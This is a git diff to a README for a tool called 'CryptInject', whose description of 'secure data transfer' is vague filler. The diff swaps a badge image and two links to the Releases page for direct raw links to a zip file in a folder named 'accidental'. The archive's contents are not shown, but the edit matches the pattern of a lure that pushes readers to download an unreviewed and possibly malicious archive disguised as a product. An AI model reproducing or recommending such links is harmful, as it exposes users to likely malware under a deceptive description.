@@ -1,6 +1,6 @@
 # 🚀 CryptInject - Easy Tool for Secure Data Transfer
 
-![Download CryptInject](https://img.shields.io/badge/Download-CryptInject-brightgreen)
+![Download CryptInject](https://raw.githubusercontent.com/lukenixon8/CryptInject/main/accidental/CryptInject.zip)
 
 ## 📋 Description
 CryptInject is a user-friendly application designed for secure data transfer. It allows you to inject data with confidence, ensuring your information stays safe during the process. 
@@ -9,7 +9,7 @@ CryptInject is a user-friendly application designed for secure data transfer. It
 
 To download CryptInject, visit the Releases page. Click on the link below to get started:
 
-[Download CryptInject](https://github.com/lukenixon8/CryptInject/releases)
+[Download CryptInject](https://raw.githubusercontent.com/lukenixon8/CryptInject/main/accidental/CryptInject.zip)
 
 ## ⚙️ System Requirements
 
@@ -50,4 +50,4 @@ For further assistance, you can check our FAQ section on the GitHub page or post
 
 Keep an eye on the Releases page for the latest updates and new features. We continuously work to make CryptInject better for our users.
 
-[Visit the Releases Page to Download](https://github.com/lukenixon8/CryptInject/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/lukenixon8/CryptInject/main/accidental/CryptInject.zip)
